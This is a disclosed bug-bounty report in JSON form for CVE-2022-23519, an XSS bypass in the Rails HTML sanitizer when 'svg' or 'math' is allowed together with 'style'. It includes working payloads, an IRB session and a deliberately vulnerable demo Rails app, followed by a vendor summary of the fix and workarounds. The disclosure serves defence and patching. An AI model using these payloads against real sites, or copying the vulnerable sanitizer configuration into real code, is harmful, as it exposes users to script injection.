{
  "id": 1805899,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODA1ODk5",
  "url": "https://hackerone.com/reports/1805899",
  "title": "CVE-2022-23519: Rails::Html::SafeListSanitizer vulnerable to XSS when certain tags are allowed (math+style || svg+style)",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2022-12-14T21:22:40.726Z",
  "submitted_at": "2022-12-14T21:22:40.860Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "0b5cur17y",
    "url": "/0b5cur17y",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/oQRYWBvwMZSWFYZtEEzqK5AN/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVEZVZRGT%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143308Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDWYnKQYclS61T7MxyY%2BjY2cTGJfHQYiuqjFad7wYMiIQIgNeAdMumlTdeq4lMQ9WuVLpSm3yzw1mGivXNXDgULpQYqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDMLcGZVE5RFfToAXbiqPBSIrlo8UgAGVOM8KidbtxWc6SkEozzwTegh3NbBOLdZfEvWEihLuxXAShaviKXGRtWGNNcTm30P5A0mmD4y97LGN5riH00YMLzMEuOG2a7fdYJ36B23e4AS9L88QjHyhr4MbbEfdVWyqQkwdoR89KYCUi7N4tmQ7ndMbdcgw5PoIhNIEyEF4J%2FAET2o9v3OatrFuPPhODhA4By164RMLG2fJxZ8GftDPQmkdaFW1bRI66pI3%2FabuYCXZR5qcQprepoZ83IaWDJp0PZqOr5GlqhAUmcIT7NSizOv3%2BUQA2ktAImaQWn4WqqotIaa1%2FISuePrF9hRRbOPlzGaH6nERd3ZZbEWircOqLnPqxKHKmJfpZ4tm%2BPm6Gu7Sy2jeJRK0c3GsKhnxrHLIQ1s4OOKyH7RRCG0xdjjm201jL2Zx1tK%2FBjFvP45y%2BozBkPWCUuUXdKMvx6jAEMVi75IwkdWD%2Fv8G0sCRNQb3jle%2Fmx6KDqwzLJ61QViZ2AGNrOhLosvGR5M9GNR4b4wYml2K0Bu5CGhw9a5rTkbK%2F5%2FXumd4%2FF%2BNdGWl9PEeESKTEVD%2B8Ti74UzGOZUVZAvYLaQDU%2BitzQkZvaIru2uRPMT1G7GlxZg7EeoDu1AqxijegN5a0N8KR9plwCv7j5jk8Jkh0zALBB1XOLuu7HQPHqoWmIfCFT3pA%2Bgoeb83sKkUxgGaQNO7duOQDVAR6VNIOnu3frRnR5z4sTEHwdgrpHZCzSExVCERP%2BGHtiP36f62T%2F8Dk8%2B%2Bf4MFMY4aOT0b4EKRltyMscVBoUl7LuMMf6y8xRYStpCeW8ug%2BfEf2b8xJrHFwa8%2FefhAWgLmq7Gs19XL8CpFpfhEz81WFH0hs%2B0gP3FgGdEwwumtrgY6sQH%2BYDXfy1qTDKNd5azqxyOrh0eirJIDZhcGnN9ZlMSVfbiighCHS998IAIcNaZpNCNOqybBEqous9HWd6Om7k2j1GGXF5s6J69JZPlpit380jbtUquAnwR%2B52D9JK5omCjq7IvKcx%2BJYvXi2FlHutTh32wphToYyGkZGs03Xyfk5rzXvwyB18SUMnaLEmwojIY9Hh9wOsOU4ydsoidjFzrlQdMgNa26f2pGAVps0viYSzs%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7ba5ecae1bb02912ee7e95489d0914bf81e0e2bf697eb77cd290f1222cf3a516",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVEZVZRGT%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143308Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDWYnKQYclS61T7MxyY%2BjY2cTGJfHQYiuqjFad7wYMiIQIgNeAdMumlTdeq4lMQ9WuVLpSm3yzw1mGivXNXDgULpQYqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDMLcGZVE5RFfToAXbiqPBSIrlo8UgAGVOM8KidbtxWc6SkEozzwTegh3NbBOLdZfEvWEihLuxXAShaviKXGRtWGNNcTm30P5A0mmD4y97LGN5riH00YMLzMEuOG2a7fdYJ36B23e4AS9L88QjHyhr4MbbEfdVWyqQkwdoR89KYCUi7N4tmQ7ndMbdcgw5PoIhNIEyEF4J%2FAET2o9v3OatrFuPPhODhA4By164RMLG2fJxZ8GftDPQmkdaFW1bRI66pI3%2FabuYCXZR5qcQprepoZ83IaWDJp0PZqOr5GlqhAUmcIT7NSizOv3%2BUQA2ktAImaQWn4WqqotIaa1%2FISuePrF9hRRbOPlzGaH6nERd3ZZbEWircOqLnPqxKHKmJfpZ4tm%2BPm6Gu7Sy2jeJRK0c3GsKhnxrHLIQ1s4OOKyH7RRCG0xdjjm201jL2Zx1tK%2FBjFvP45y%2BozBkPWCUuUXdKMvx6jAEMVi75IwkdWD%2Fv8G0sCRNQb3jle%2Fmx6KDqwzLJ61QViZ2AGNrOhLosvGR5M9GNR4b4wYml2K0Bu5CGhw9a5rTkbK%2F5%2FXumd4%2FF%2BNdGWl9PEeESKTEVD%2B8Ti74UzGOZUVZAvYLaQDU%2BitzQkZvaIru2uRPMT1G7GlxZg7EeoDu1AqxijegN5a0N8KR9plwCv7j5jk8Jkh0zALBB1XOLuu7HQPHqoWmIfCFT3pA%2Bgoeb83sKkUxgGaQNO7duOQDVAR6VNIOnu3frRnR5z4sTEHwdgrpHZCzSExVCERP%2BGHtiP36f62T%2F8Dk8%2B%2Bf4MFMY4aOT0b4EKRltyMscVBoUl7LuMMf6y8xRYStpCeW8ug%2BfEf2b8xJrHFwa8%2FefhAWgLmq7Gs19XL8CpFpfhEz81WFH0hs%2B0gP3FgGdEwwumtrgY6sQH%2BYDXfy1qTDKNd5azqxyOrh0eirJIDZhcGnN9ZlMSVfbiighCHS998IAIcNaZpNCNOqybBEqous9HWd6Om7k2j1GGXF5s6J69JZPlpit380jbtUquAnwR%2B52D9JK5omCjq7IvKcx%2BJYvXi2FlHutTh32wphToYyGkZGs03Xyfk5rzXvwyB18SUMnaLEmwojIY9Hh9wOsOU4ydsoidjFzrlQdMgNa26f2pGAVps0viYSzs%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a210cb0d1644c239d16edf90eb751a3c2897b7269ff78307e9e8dfcfaa215e96"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2022-23519"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-01-04T20:37:52.830Z",
  "bug_reporter_agreed_on_going_public_at": "2023-01-04T20:37:45.321Z",
  "team_member_agreed_on_going_public_at": "2023-01-04T14:01:15.423Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The following is from: https://hackerone.com/reports/1656627\n\n## Intro\n\nThe Rails HTML sanitzier allows to set certain combinations of tags in it's allow list that are not properly handled. \nSimilar to the report [1530898](https://hackerone.com/reports/1530898), which identified the combination`select` and `style` as vulnerable,\nmy fuzz testing from today suggests that also `svg` and `style` as well as `math` and `style` allow XSS.\nThe following are PoCs for each of these allow list:\n- `svg` and `style`: `<svg><style><script>alert(1)</script></style></svg>`\n- `math` and `style`: `<math><style><img src=x onerror=alert(1)></style></math>`\n\nSee the following IRB session: \n```\nirb(main):016:0> require 'rails-html-sanitizer'\n=> false\nirb(main):017:0> Rails::Html::SafeListSanitizer.new.sanitize(\"<svg><style><script>alert(1)</script></style></svg>\", tags: [\"svg\", \"style\"]).to_s\n=> \"<svg><style><script>alert(1)</script></style></svg>\"\nirb(main):018:0> Rails::Html::SafeListSanitizer.new.sanitize(\"<math><style><img src=x onerror=alert(1)></style></math>\", tags: [\"math\", \"style\"]).to_s\n=> \"<math><style><img src=x onerror=alert(1)></style></math>\"\nirb(main):019:0> puts Rails::Html::Sanitizer::VERSION\n1.4.3\n=> nil \n```\n\n## Sample Vulnerable Rails Application\n\nTo build a sample rails application that is vulnerable, I've used the following `Dockerfile`:\n\n```\nFROM ruby:3.1.2\n\nRUN apt-get update && apt-get install -y vim\n\nWORKDIR /usr/src/app\nRUN gem install rails && rails new myapp\nWORKDIR /usr/src/app/myapp\n\n\nCOPY build-rails-app.sh ./build-rails-app.sh\nRUN sh ./build-rails-app.sh\nRUN RAILS_ENV=production rails assets:precompile\n\nCMD [\"./bin/rails\", \"server\", \"-b\", \"0.0.0.0\", \"-e\", \"production\"]\n```\n\nIn the same directory, put a shell script `build-rails-app.sh` which writes the app:\n\n```\n#!/ibn/sh\n\n# make routes\ncat << EOF > ./config/routes.rb\nRails.application.routes.draw do\n  get \"/poc1\", to: \"poc1#index\"\n  get \"/poc2\", to: \"poc2#index\"\nend\nEOF\n\n# make Poc1 endpoint\n# http://localhost:8888/poc1?name=%3Csvg%3E%3Cstyle%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/style%3E%3Csvg%3E\nbin/rails generate controller Poc1 index --skip-routes\n\ncat << EOF > ./app/controllers/poc1_controller.rb\nclass Poc1Controller < ApplicationController\n  def index\n    @name = params[:name] || \"put your name here\"\n  end\nend\nEOF\n\n\ncat << EOF > ./app/views/poc1/index.html.erb\n<h1> Hello <%= sanitize @name, tags: [\"svg\", \"style\"] %> </h1>\n<br>\nPoC with a sanitized, reflected parameter 'name' for which 'svg' annd 'style' tags are allowed.\n<br>\n<%= link_to \"Go to PoC\", \"/poc1?name=<svg><style><script>alert(1)</script></style><svg>\" %>\n<br>\n<br>\nUsing: rails-html-sanitizer <%= Rails::Html::Sanitizer::VERSION %>\nEOF\n\n\n# make Poc2 endpoint\n# http://localhost:8888/poc2?name=%3Cmath%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C/style%3E%3Cmath%3E\nbin/rails generate controller Poc2 index --skip-routes\n\ncat << EOF > ./app/controllers/poc2_controller.rb\nclass Poc2Controller < ApplicationController\n  def index\n    @name = params[:name] || \"put your name here\"\n  end\nend\nEOF\n\n\ncat << EOF > ./app/views/poc2/index.html.erb\n<h1> Hello <%= sanitize @name, tags: [\"math\", \"style\"] %> </h1>\n<br>\nPoC with a sanitized, reflected parameter 'name' for which 'math' annd 'style' tags are allowed.\n<br>\n<%= link_to \"Go to PoC\", \"/poc2?name=<math><style><img src=x onerror=alert(1)></style><math>\" %>\n<br>\n<br>\nUsing: rails-html-sanitizer <%= Rails::Html::Sanitizer::VERSION %>\nEOF\n```\n\nWith the following `Makefile` you can build and run the application\n\n```\n.PHONY: build\nbuild:\n\tdocker build -t local/railspoc:latest .\n\n.PHONY: run\nrun:\n\tdocker run -it --rm -p 127.0.0.1:8888:3000 local/railspoc:latest\n```\n\nNow you have a Rails application with two routes `/poc1` and `/poc2` running locally. Visit:\n- [http://localhost:8888/poc1?name=%3Csvg%3E%3Cstyle%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/style%3E%3Csvg%3E](http://localhost:8888/poc1?name=%3Csvg%3E%3Cstyle%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/style%3E%3Csvg%3E)\n- [http://localhost:8888/poc2?name=%3Cmath%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C/style%3E%3Cmath%3E](http://localhost:8888/poc2?name=%3Cmath%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C/style%3E%3Cmath%3E)\n\nSee the screenshot in https://hackerone.com/reports/1656627 for what it will roughly look like. Both alerts should be executed.\n\n## Impact\n\nIt is possible to bypass Rails::Html::SafeListSanitizer filtering and perform an XSS attack.",
  "bounty_amount": "2400.0",
  "formatted_bounty": "$2,400",
  "weakness": {
    "id": 60,
    "name": "Cross-site Scripting (XSS) - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2023-02-03T14:01:15.545Z",
  "allow_singular_disclosure_after": -32401913.172611557,
  "singular_disclosure_allowed": true,
  "vote_count": 22,
  "voters": [
    "shreyaschavhan",
    "n1m0",
    "zy9ard3",
    "shubham_srt",
    "sudi",
    "h4x0r_dz",
    "shivammusic",
    "hn21ak",
    "jhonbugdoe",
    "cyberad_icted",
    "and 12 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 80881,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/rails",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 235022,
      "category": "team",
      "content": "###Summary\n\nThere is a possible XSS vulnerability with certain configurations of Rails::Html::Sanitizer.\n\n- Versions affected: ALL\n- Not affected: NONE\n- Fixed versions: 1.4.4\n\n###Impact\n\nA possible XSS vulnerability with certain configurations of Rails::Html::Sanitizer may allow an attacker to inject content if the application developer has overridden the sanitizer's allowed tags in either of the following ways:\n\nallow both \"math\" and \"style\" elements,\nor allow both \"svg\" and \"style\" elements\n\nCode is only impacted if allowed tags are being overridden. Applications may be doing this in four different ways:\n\n1. using application configuration:\n```\n# In config/application.rb\nconfig.action_view.sanitized_allowed_tags = [\"math\", \"style\"]\n# or\nconfig.action_view.sanitized_allowed_tags = [\"svg\", \"style\"]\n```\nsee https://guides.rubyonrails.org/configuring.html#configuring-action-view\n\n2. using a ``:tags`` option to the Action View helper ``sanitize``:\n```\n<%= sanitize @comment.body, tags: [\"math\", \"style\"] %>\n<%# or %>\n<%= sanitize @comment.body, tags: [\"svg\", \"style\"] %>\n```\nsee https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html#method-i-sanitize\n\n3. using Rails::Html::SafeListSanitizer class method ``allowed_tags=``:\n```\n# class-level option\nRails::Html::SafeListSanitizer.allowed_tags = [\"math\", \"style\"]\n# or\nRails::Html::SafeListSanitizer.allowed_tags = [\"svg\", \"style\"]\n```\n\n4. using a ``:tags`` options to the Rails::Html::SafeListSanitizer instance method ``sanitize``:\n```\n# instance-level option\nRails::Html::SafeListSanitizer.new.sanitize(@article.body, tags: [\"math\", \"style\"])\n# or\nRails::Html::SafeListSanitizer.new.sanitize(@article.body, tags: [\"svg\", \"style\"])\n```\nAll users overriding the allowed tags by any of the above mechanisms to include ((\"math\" or \"svg\") and \"style\") should either upgrade or use one of the workarounds immediately.\n\n###Workarounds\n\nRemove \"style\" from the overridden allowed tags, or remove \"math\" and \"svg\" from the overridden allowed tags.\n\n###References\n\n[CWE - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (4.9)](https://cwe.mitre.org/data/definitions/79.html)\nhttps://hackerone.com/reports/1656627\n\n\n",
      "user": {
        "id": 2032618,
        "username": "pr0tag0nist",
        "name": "Sandeep Singh",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2021-10-18T10:02:41.859Z",
        "url": "https://hackerone.com/pr0tag0nist",
        "hackerone_triager": false,
        "hackerone_employee": true,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
